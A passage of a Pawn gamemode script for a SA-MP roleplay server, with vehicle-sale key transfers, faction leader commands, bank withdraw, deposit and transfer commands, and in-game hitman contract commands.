							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pCarkey14x);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pCarkey14x);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pCarkey14x);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pCarkey14x);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pCarkey14x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pCarkey14x);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 14;
					}
					else if(PlayerInfo[playerid][pCarkey15] == 0)
					{
						if(PlayerInfo[playerid][pVip] < 1) return SCM(playerid, COLOR_ERROR, "Your account is Standard, you need a VIP account to hold more vehicles.");
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pCarkey15x);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pCarkey15x);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pCarkey15x);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pCarkey15x);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pCarkey15x);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pCarkey15x);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pCarkey15x);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pCarkey15x);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pCarkey15x);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey15x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pCarkey15x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pCarkey15x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pCarkey15x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pCarkey14x);
							Update(ofercar[playerid],pCarkey15x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pCarkey15] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pCarkey15x);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 15;
					}
					if(tipmasina == 1)
					{
						personalcar[0][ofercar[playerid]] = 0;
					}
					if(tipmasina == 2)
					{
					    personalcar[1][ofercar[playerid]] = 0;
					}
					if(tipmasina == 3)
					{
					    personalcar[2][ofercar[playerid]] = 0;
					}
					if(tipmasina == 4)
					{
					    personalcar[3][ofercar[playerid]] = 0;
					}
					if(tipmasina == 5)
					{
					    personalcar[4][ofercar[playerid]] = 0;
					}
					if(tipmasina == 6)
					{
					    personalcar[5][ofercar[playerid]] = 0;
					}
					if(tipmasina == 7)
					{
					    personalcar[6][ofercar[playerid]] = 0;
					}
					if(tipmasina == 8)
					{
					    personalcar[7][ofercar[playerid]] = 0;
					}
					if(tipmasina == 9)
					{
					    personalcar[8][ofercar[playerid]] = 0;
					}
					if(tipmasina == 10)
					{
					    personalcar[9][ofercar[playerid]] = 0;
					}
					if(tipmasina == 11)
					{
					    personalcar[10][ofercar[playerid]] = 0;
					}
					if(tipmasina == 12)
					{
					    personalcar[11][ofercar[playerid]] = 0;
					}
					if(tipmasina == 13)
					{
					    personalcar[12][ofercar[playerid]] = 0;
					}
					if(tipmasina == 14)
					{
					    personalcar[13][ofercar[playerid]] = 0;
					}
					if(tipmasina == 15)
					{
					    personalcar[14][ofercar[playerid]] = 0;
					}
					new sendernames[30],giveplayers[30],stringy[256],vehID = OwnedVeh(GetPlayerVehicleID(playerid));
					GetPlayerName(playerid,sendernames,sizeof(sendernames));
					GetPlayerName(ofercar[playerid],giveplayers,sizeof(giveplayers));
                    format(stringy, sizeof(stringy), "* %s sold his %s [car:%d] to %s for $%s.",giveplayers,CarInfo[vehID][cDescription],CarInfo[vehID][cID],sendernames,FormatNumber(carprice[playerid]));
                    ProxDetector(30.0, playerid, stringy, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, stringy);
					SendClientMessage(ofercar[playerid], COLOR_LIGHTBLUE, stringy);
					ABroadCast(COLOR_YELLOW, stringy,1);
					new var100[256],y,m,d,h,mi,s,string2[256],string3[256];
					getdate(y,m,d);
					gettime(h,mi,s);
					format(string2,sizeof(string2),"[%02d-%02d-%d %02d:%02d:%02d] %s[user:%d] sold car %d to %s[user:%d] for $%s.",d,m,y,h,mi,s,giveplayers,PlayerInfo[ofercar[playerid]][pSQLID],CarInfo[vehID][cID],sendernames,PlayerInfo[playerid][pSQLID],FormatNumber(carprice[playerid]));
 					mysql_real_escape_string(string2, string3);
					mysql_format(SQL, var100, sizeof(var100), "INSERT INTO playerlogs (`playerid`,`giverid`,`action`,`time`) VALUES ('%d','%d','%s','%02d-%02d-%d %02d:%02d:%02d')", PlayerInfo[playerid][pSQLID],PlayerInfo[ofercar[playerid]][pSQLID],string3,d,m,y,h,mi,s);
					mysql_tquery(SQL,var100,"","");
					new vehhh = GetPlayerVehicleID(playerid);
					if(vehiculprimit == 1)
					{
					    personalcar[0][playerid] = vehhh;
					}
					else if(vehiculprimit == 2)
					{
					    personalcar[1][playerid] = vehhh;
					}
					else if(vehiculprimit == 3)
					{
					    personalcar[2][playerid] = vehhh;
					}
					else if(vehiculprimit == 4)
					{
					    personalcar[3][playerid] = vehhh;
					}
					else if(vehiculprimit == 5)
					{
					    personalcar[4][playerid] = vehhh;
					}
					else if(vehiculprimit == 6)
					{
					    personalcar[5][playerid] = vehhh;
					}
					else if(vehiculprimit == 7)
					{
					    personalcar[6][playerid] = vehhh;
					}
					else if(vehiculprimit == 8)
					{
					    personalcar[7][playerid] = vehhh;
					}
					else if(vehiculprimit == 9)
					{
					    personalcar[8][playerid] = vehhh;
					}
					else if(vehiculprimit == 10)
					{
					    personalcar[9][playerid] = vehhh;
					}
					else if(vehiculprimit == 11)
					{
					    personalcar[10][playerid] = vehhh;
					}
					else if(vehiculprimit == 12)
					{
					    personalcar[11][playerid] = vehhh;
					}
					else if(vehiculprimit == 13)
					{
					    personalcar[12][playerid] = vehhh;
					}
					else if(vehiculprimit == 14)
					{
					    personalcar[13][playerid] = vehhh;
					}
					else if(vehiculprimit == 15)
					{
					    personalcar[14][playerid] = vehhh;
					}
					RemovePlayerFromVehicleEx(ofercar[playerid]);
					GivePlayerCash(playerid, - carprice[playerid]);
	    			GivePlayerCash(ofercar[playerid], carprice[playerid]);
					Update(playerid,pCashx);
					Update(ofercar[playerid],pCashx);
					strmid(CarInfo[CarID[playerid]][cOwner], PlayerInfo[playerid][pNormalName], 0, 25, 999);
	    			vUpdate(CarID[playerid],cOwnerx);
					ofercar[playerid] = -1;
    				carprice[playerid] = 0;
       				primesccar[playerid] = 0;
       				cartype[playerid] = 0;
       				CarID[playerid] = -1;
    				SwitchKey[playerid] = 1;
				}
				else return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have money needed.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "Available names:{B8DBFF} Drugs, Repair");
			SendClientMessage(playerid, COLOR_SERVER, "Available names:{B8DBFF} Vehicle, Taxi, Medic, Live");
			SendClientMessage(playerid, COLOR_SERVER, "Available names:{B8DBFF} Mechanic, Ticket, Refill");
			return 1;
		}
	}
	return 1;
}
CMD:leaderhelp(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pLeader] < 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Leader.");
		SendClientMessage(playerid, COLOR_SERVER,"Leader Help: Type a command for more help.");
		SendClientMessage(playerid, COLOR_SERVER,"{3385FF}Leader: /invite /changerank");
		SendClientMessage(playerid, COLOR_SERVER,"{3385FF}Leader: /fwarn /funwarn /fvrespawn /members /l /togapplications");
		if(PlayerInfo[playerid][pLeader] == 4 || PlayerInfo[playerid][pLeader] == 5 || PlayerInfo[playerid][pLeader] == 6 || PlayerInfo[playerid][pLeader] == 10)
		{
			SendClientMessage(playerid, COLOR_SERVER,"{3385FF}Leader: /fwithdraw /fdrugs");
		}
	}
	return 1;
}
CMD:invite(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pRank] >= 6)
		{
			new id,string[256],string2[256],giveplayer[30],sendername[30];
			if(sscanf(params, "u", id)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/invite <Name/Playerid>");
			if(PlayerInfo[id][pFpunish] != 0) return SCM(playerid,COLOR_SERVER,"{FFB870}You can not invite this player because it has faction punish.");
            new membrii = GetFactionMembers(PlayerInfo[playerid][pMember]);
   			if(membrii >= DynamicFactions[PlayerInfo[playerid][pMember]][fMaxMembers]) return SendClientMessage(playerid, COLOR_ERROR, "You have reached maximum faction members.");
			if(PlayerInfo[id][pLevel] < DynamicFactions[PlayerInfo[playerid][pMember]][fMinLevel])
			{
				format(string,sizeof(string),"Pentru a invita un membru in aceasta factiune acesta trebuie sa aiba minim level %d.",DynamicFactions[PlayerInfo[playerid][pMember]][fMinLevel]);
				SendClientMessage(playerid, COLOR_ERROR, string);
				return 1;
			}
			if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
					if(PlayerInfo[id][pMember] == 0 && PlayerInfo[id][pLeader] == 0)
					{
    					GetPlayerName(playerid, sendername, sizeof(sendername));
						GetPlayerName(id, giveplayer, sizeof(giveplayer));
						format(string, sizeof(string), "%s has invited you to join group %s (to accept the invitation, type '/accept invite %d').", sendername, DynamicFactions[PlayerInfo[playerid][pMember]][fName], playerid);
						SendClientMessage(id, COLOR_LIGHTBLUE, string);
						SendClientMessage(playerid, COLOR_ERROR, "Processing invite...");
						format(string2, sizeof(string2), "You have invited %s to join your group.", giveplayer);
						SendClientMessage(playerid, COLOR_SERVER, string2);
						FactionOffer[id] = playerid;
                    }
					else
					{
	    				SendClientMessage(playerid, COLOR_SERVER, "{FFB870}This player is already in a faction.");
						return 1;
					}
				}
			}
			else
	    	{
                SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	    	}
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Only leaders can use this command.");
  		}
	}
	return 1;
}
CMD:window(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    new window, /*vehicleid = GetPlayerVehicleID(playerid),*/ driver, passenger, backleft, backright, string[100];
	    //GetVehicleParamsCarWindows(vehicleid, driver, passenger, backleft, backright);
	    if(sscanf(params, "d", window))
		{
		    format(string,sizeof(string),"{B8DBFF}Windows status: %d %d %d %d", driver, passenger, backleft, backright);
			SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/window <1-4>");
			SendClientMessage(playerid, 0xFFFFFFFF,string);
			return 1;
		}
		if(window < 1 || window > 4) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/window <1-4>");
		else if(window == 1)
		{
		    //if(driver == 0) { SetVehicleParamsCarWindows(vehicleid, 1, passenger, backleft, backright); } else { SetVehicleParamsCarWindows(vehicleid, 0, passenger, backleft, backright); }
		}
		else if(window == 2)
		{
		    //if(passenger == 0) { SetVehicleParamsCarWindows(vehicleid, driver, 1, backleft, backright); } else { SetVehicleParamsCarWindows(vehicleid, driver, 0, backleft, backright); }
		}
		else if(window == 3)
		{
		    //if(backleft == 0) { SetVehicleParamsCarWindows(vehicleid, driver, passenger, 1, backright); } else { SetVehicleParamsCarWindows(vehicleid, driver, passenger, 0, backright); }
		}
		else if(window == 4)
		{
		    //if(backright == 0) { SetVehicleParamsCarWindows(vehicleid, driver, passenger, backleft, 1); } else { SetVehicleParamsCarWindows(vehicleid, driver, passenger, backleft, 0); }
		}
	}
	return 1;
}
CMD:changerank(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pLeader] >= 1)
	 	{
			new para1,level,string[256],giveplayer[30],sendername[30],rtext[64];
			if(sscanf(params, "ui", para1,level)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/changerank <Name/Playerid> <Rank(1-6)>");
			if(level > 6 || level < 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Dont go below number 1 or above number 6.");
			if(PlayerInfo[para1][pMember] != PlayerInfo[playerid][pLeader]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}This member is not in your faction.");
			if(PlayerInfo[para1][pLeader] > 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This player is a leader.");
			if(para1 != INVALID_PLAYER_ID)
			{
				GetPlayerName(para1, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(level == 1) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1]);
				else if(level == 2) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName2]);
				else if(level == 3) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName3]);
				else if(level == 4) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName4]);
				else if(level == 5) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName5]);
				else if(level == 6) format(rtext, sizeof(rtext),"%s",DynamicFactions[PlayerInfo[playerid][pMember]][fRankName6]);
				format(string,sizeof(string),"%s changed %s's faction rank from %d to %d.",sendername,giveplayer,PlayerInfo[para1][pRank],level);
				Factionlog(PlayerInfo[para1][pMember],PlayerInfo[para1][pSQLID],PlayerInfo[playerid][pSQLID],string);
				PlayerInfo[para1][pRank] = level;
				format(string, sizeof(string), "%s has promoted you to the rank of %s (%d).", sendername,rtext,level);
				SendClientMessage(para1, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "You have promoted %s to the rank of %s (%d).", giveplayer,rtext,level);
				SendClientMessage(playerid, COLOR_SERVER, string);
        		new str[256];
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Rank`='%d' WHERE `name`='%s'",PlayerInfo[para1][pRank],PlayerInfo[para1][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
	     	else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Only leaders can use this command.");
	}
	return 1;
}
CMD:withdraw(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
     	if(IsAtBank(playerid))
		{
			new money,string[100];
			if(sscanf(params, "i", money))
			{
				new mymoney[LY_STRING_LEN];  
				GetLYString(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], mymoney);
				SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/withdraw <Amount of Money>");
				format(string, sizeof(string), "{FFFF00}You have $%s in your account.", FormatBigNumber(mymoney));
				SendClientMessage(playerid, COLOR_SERVER, string);
				return 1;
			}
			if(money < 1 || money > 100000000) return SCM(playerid, COLOR_ERROR, "Minim $1 / Maxim $100,000,000");
			if(!IsValueContainLY(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], money)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Nu detii aceasta suma.");
		    ConsumingMoney[playerid] = 1;
			GivePlayerCash(playerid, money);
			addVV(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc],-money);
			new mymoney[LY_STRING_LEN];  
			GetLYString(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], mymoney);
			format(string, sizeof(string), "{FFFF00}You have withdrawn $%s from your account Total: $%s.", FormatNumber(money),FormatBigNumber(mymoney));
			SendClientMessage(playerid, COLOR_SERVER, string);
    		new str[168];
			mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Money`='%d',`Bank2`='%s' WHERE `name`='%s'",GetPlayerCash(playerid),mymoney,PlayerInfo[playerid][pNormalName]);
			mysql_tquery(SQL,str,"","");
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "You are not at the bank!");
	        return 1;
 		}
	}
	return 1;
}
CMD:deposit(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
     	if(IsAtBank(playerid))
		{
			new money,string[100];
			if(sscanf(params, "i", money))
			{
				new mymoney[LY_STRING_LEN];  
				GetLYString(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], mymoney);
				SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/deposit <Amount of Money>");
				format(string, sizeof(string), "{FFFF00}You have $%s in your account.", FormatBigNumber(mymoney));
				SendClientMessage(playerid, COLOR_SERVER, string);
				return 1;
			}
			if(money < 1 || money > 1000000000) return SCM(playerid, -1,"Minim $1 / Maxim $1,000,000,000");
			if(money > GetPlayerCash(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Nu detii aceasta suma.");
			GivePlayerCash(playerid, -money);
			new mymoney[LY_STRING_LEN];  
			addVV(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], money);
			GetLYString(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], mymoney);
			SendClientMessage(playerid, COLOR_SERVER, "|___ BANK STATMENT ___|");
			format(string, sizeof(string), " Old Balance: $%s", FormatBigNumber(mymoney));
			SendClientMessage(playerid, COLOR_GRAD2, string);
			format(string, sizeof(string), " Deposit: $%s",FormatNumber(money));
			SendClientMessage(playerid, COLOR_GRAD4, string);
			SendClientMessage(playerid, COLOR_GRAD6, "|-----------------------------------------|");
		    format(string, sizeof(string), " New Balance: $%s", FormatBigNumber(mymoney));
		    SendClientMessage(playerid, COLOR_SERVER1, string);
			Update(playerid, pBank);
			Update(playerid, pCashx);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "You are not at the bank!");
	        return 1;
 		}
	}
	return 1;
}
CMD:balance(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
        if(IsAtBank(playerid))
	    {
			new mymoney[LY_STRING_LEN];
			GetLYString(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], mymoney);
			new string[100];
			format(string, sizeof(string), "{FFFF00}You have $%s in your account.", FormatBigNumber(mymoney));
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "You are not at the bank!");
	        return 1;
 		}
	}
	return 1;
}
CMD:transfer(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pLevel] < 5) return SendClientMessage(playerid, COLOR_SERVER, "{FFFFFF}You need level 5 to do this.");
        if(IsAtBank(playerid) || accestransfer[playerid] > 0)
	    {
			new id,moneytransfer,string[100],giveplayer[30],sendername[30];
			if(sscanf(params, "ui", id,moneytransfer)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/transfer <Name/Playerid> <Amount of Money>");
			if(playerid == id) return SCM(playerid,COLOR_SERVER,"{FFB870}You can not transfer the money to you");
			if(IsPlayerConnected(id))
			{
                if(id != INVALID_PLAYER_ID)
			    {
			    	if(gPlayerLogged[id] == 0) return SendClientMessage(playerid, COLOR_ERROR, "That player is not logged in.");
					if(PlayerInfo[playerid][pConnectTime] < 5) return SCM(playerid, COLOR_ERROR, "You need 5 hours to use this command.");
					GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					if(moneytransfer > 0 && IsValueContainLY(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], moneytransfer) && moneytransfer < 900000001)
					{
					    new cashbank;
					    if(IsAtBank(playerid))
					    {
					    	if(PlayerInfo[playerid][pLevel] < 7 && moneytransfer >= 900000000) return SCM(playerid, COLOR_SERVER, "You can not transfer more than 900.000.000$ to level 7");
							if(PlayerInfo[id][pLevel] < 5 && moneytransfer >= 450000000) return SCM(playerid, COLOR_SERVER, "You can not transfer more than 450.000.000$ that player until it is level 5");
						 	cashbank = floatround(floatmul(moneytransfer,0.10),floatround_ceil);
						}
						else if(accestransfer[playerid] > 0)
						{
						    if(moneytransfer > 3000000) return SCM(playerid, COLOR_ERROR, "You chose to make a transaction at an ATM maximum is $3,000,000");
							cashbank = floatround(floatmul(moneytransfer,0.25),floatround_ceil);
						}
						format(string,sizeof(string),"Are you sure you Want to transfer %s$ to %s?\nTax is $%s.",FormatNumber(moneytransfer),giveplayer,FormatNumber(cashbank));
						TransferOffer[playerid] = id;
						TransferMoney[playerid] = moneytransfer;
						ShowPlayerDialog(playerid, DIALOG_TRANSFER, DIALOG_STYLE_MSGBOX, "Transfer:", string, "Yes", "No");
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You do not have enough money or the amount is less than $1 or higher $900,000,000.");
				}
	        }
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
    	}
		else return SendClientMessage(playerid, COLOR_SERVER, "You're not in the bank, or you are at an ATM.");
	}
	return 1;
}
CMD:undercover(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    {
		if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
		{
		    if(Undercover[playerid] == 0 && GoChase[playerid] == 999) return SendClientMessage(playerid, COLOR_SERVER, "You don't have a contract.");
			if(Undercover[playerid] == 0)
			{
		    	SCM(playerid, COLOR_YELLOW, "You are now undercover. No one can see your name.");
		    	Undercover[playerid] = 1;
		    	foreach(Player,i)
     			{
      				ShowPlayerNameTagForPlayer(i, playerid, 0);
           		}
			}
			else
			{
		    	SCM(playerid, COLOR_YELLOW, "You are not undercover anymore. Anyone can see your name.");
		    	Undercover[playerid] = 0;
				foreach(Player,i)
     			{
      				ShowPlayerNameTagForPlayer(i, playerid, 1);
           		}
			}
 		}
 		else return SendClientMessage(playerid, COLOR_ERROR, "You are not a hitman.");
	}
	return 1;
}
CMD:gethit(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    {
        if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11) {} else return SendClientMessage(playerid, COLOR_ERROR, "You are not a hitman.");
		{
		    new searchhit = 0,cid[MAX_PLAYERS],sendername[30],giveplayer[30],string[128];
		    if(GoChase[playerid] != 999)
			{
				SCM(playerid,COLOR_SERVER,"{FFB870}You already have a contract.");
				return 1;
			}
		    if(PlayerInfo[playerid][pHitT] != 0)
		    {
				SCM(playerid,COLOR_SERVER,"You must wait 5 minutes after you canceled/terminated a contract to use/gethit.");
				return 1;
		    }
			foreach(Player,i)
			{
			    if(PlayerInfo[i][pHeadValue] > 0 && GotHit[i] == 0 && PlayerInfo[i][pMember] != 11 && gPlayerLogged[i] == 1)
			    {
			        searchhit = 1;
			        cid[playerid] = i;
			    }
		    }
			if(searchhit == 0)
			{
			    SendClientMessage(playerid, COLOR_YELLOW, "No contracts available.");
			    return 1;
			}
			if(IsPlayerConnected(cid[playerid]))
		    {
		        GetPlayerName(playerid, sendername, sizeof(sendername));
		        GetPlayerName(cid[playerid], giveplayer, sizeof(giveplayer));
				format(string, sizeof(string), "%s received a contract. Target: %s.", sendername, giveplayer);
				SendFamilyMessage(11, COLOR_TEAL, string);
				SendClientMessage(playerid, COLOR_YELLOW, "You have a new contract(/mycontract).");
			    GoChase[playerid] = cid[playerid];
				GetChased[cid[playerid]] = playerid;
				GotHit[cid[playerid]] = 1;
				foreach(Player,i)
	            togfind[playerid] = 1;
